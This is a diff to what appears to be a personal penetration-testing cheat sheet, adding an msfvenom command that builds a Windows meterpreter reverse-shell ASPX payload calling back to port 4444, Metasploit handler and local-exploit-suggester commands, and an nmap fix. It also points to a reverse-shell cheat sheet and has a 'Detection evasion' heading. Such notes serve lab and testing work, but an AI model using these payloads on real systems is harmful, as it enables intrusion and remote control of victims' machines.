@@ -3,7 +3,7 @@
 ## Evaluation
 ```bash
 # Shows version information
-nmap -sC -sV -oA <ip>
+nmap -sC -sV -oA <name> <ip>
 ```
 ## Reverse shell
 
@@ -83,7 +83,21 @@ prefix key: ctrl+b
 |space|cycle looks|
 |t|show time|
 
+## msfvenom
+Payload generator
+example aspx generator for reverse shell
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx > shell.aspx
+```
 
+## msfconsole
+```bash
+# Generic reverse shell for use with the payload.
+use exploit/multi/handler
+
+# Suggest working exploits for detected version
+use post/multi/recon/local_exploit_suggester
+```
 
 # Detection evasion
 ## Linux
@@ -91,6 +105,7 @@ prefix key: ctrl+b
 
 # Note keeping
 Cherry Tree - Hierarchical tool with code highlight and screen capture
+ctrl+shift+prtscr for screenshot selection
 
 # Resources
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
